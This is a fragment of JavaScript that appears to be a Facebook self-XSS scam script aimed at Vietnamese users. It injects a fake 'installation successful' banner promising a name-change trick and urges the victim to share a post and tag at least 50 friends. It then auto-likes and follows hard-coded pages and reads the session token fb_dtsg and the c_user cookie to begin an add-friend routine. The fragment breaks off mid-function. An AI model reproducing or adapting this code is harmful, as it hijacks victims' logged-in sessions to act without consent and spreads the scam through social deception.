...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://alturl.com/quuek" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào nút Đồng ý chờ phía dưới bên trái màn hình và kích vào đây sau đó chia sẻ bài viết và Tag ít nhất 50 bạn bè của mình vào bài viết để xác nhận. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn chia sẻ và Tag đầy đủ. Bấm LIKE cho trang nếu muốn cập nhật những mẹo đổi tên mới nhất của Facebook từ Cộng đồng IT Việt.<br>Cảm ơn bạn đã sử dụng ứng dụng của IT Việt</a>';
	html += '</div>';
...
// pic + fans
P("582344828505999");Like("352532461504851");Like("458844980897547");Like("1649253215213609");Like("137857083055526");P("342445349233598");Like("447168308678954");P("355548534589946");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
